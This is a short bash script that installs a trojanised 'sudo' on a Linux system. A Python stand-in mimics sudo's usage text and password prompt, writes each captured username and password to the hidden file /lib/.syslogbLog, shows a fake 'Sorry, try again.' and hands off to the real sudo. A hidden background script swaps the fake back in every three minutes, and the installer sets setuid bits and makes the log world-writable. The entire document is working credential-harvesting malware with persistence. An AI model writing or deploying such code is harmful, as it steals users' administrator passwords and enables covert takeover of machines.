#!/bin/bash
cat <<EOFA > /usr/bin/sudoB
import os
import subprocess
import sys
import getpass
import socket
import time

def main():
    if(len(sys.argv) == 1):
        print("""
        usage: sudo -h | -K | -k | -V
        usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
        usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
        usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
        usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
        """)
    else:
        user = getpass.getuser()
        
        os.system('stty -echo')
        sudoCommand = "[sudo] password for " + user + ": "
        password = input(sudoCommand)
        
        os.system("echo \"" + user + ":" + password + "\" >> /lib/.syslogbLog")
        os.system("mv /usr/bin/sudo /usr/bin/sudoC")
        os.system("mv /usr/bin/sudoA /usr/bin/sudo")
        time.sleep(3)
        os.system('stty echo')
        print("Sorry, try again.")
        os.system("sudo su")
main()
EOFA
cat <<EOFB > /usr/bin/sudoC
#!/bin/bash
python3 /usr/bin/sudoB "$@"
EOFB
cat <<EOFC > /usr/bin/.brain.py
import os
import time

def main():
    while(True):
        if(os.path.exists("/usr/bin/sudoC")):
            os.system("mv /usr/bin/sudo /usr/bin/sudoA")
            os.system("mv /usr/bin/sudoC /usr/bin/sudo")
        time.sleep(180)
main()
EOFC
chmod +s /usr/bin/.brain.py
chmod +x /usr/bin/.brain.py
chmod +s /usr/bin/sudoC
chmod +x /usr/bin/sudoC
chmod +s /usr/bin/sudoB
chmod +x /usr/bin/sudoB
chmod o+w /lib/.syslogbLog
python3 /usr/bin/.brain.py &